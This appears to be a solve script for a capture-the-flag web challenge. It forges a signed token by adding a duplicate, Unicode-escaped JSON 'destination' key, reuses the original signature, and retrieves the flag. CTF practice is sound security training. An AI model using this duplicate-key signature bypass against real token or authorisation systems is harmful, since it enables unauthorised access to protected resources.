import requests 
import json
import base64

url = 'http://chals.cyberthon26f.ctf.sg:31552/' 
s = requests.Session() 

# get valid token
res = s.post(f'{url}/api/rune/issue', json={
    'destination': 'PLAINS_OUTPOST'
})

token = res.json()['rune']
print("> Token:", token)

# extract nonce
body, sig = token.split('.', 1)
nonce = json.loads(base64.b64decode(body + '=='))['nonce']

# duplicate key exploit
payload = '''{
  "destination": "PLAINS_OUTPOST",
  "destination": "S\\u0041NCTUM_OF_THE_VOID",
  "nonce": "%s"
}''' % nonce

token = f"{base64.b64encode(payload.encode()).decode().rstrip('=')}.{sig}"

print("> Payload:", token)

res = s.post(f'{url}/api/portal/warp', json={
    'rune': token
})

flag = res.json()['flag']
print("Flag:", flag)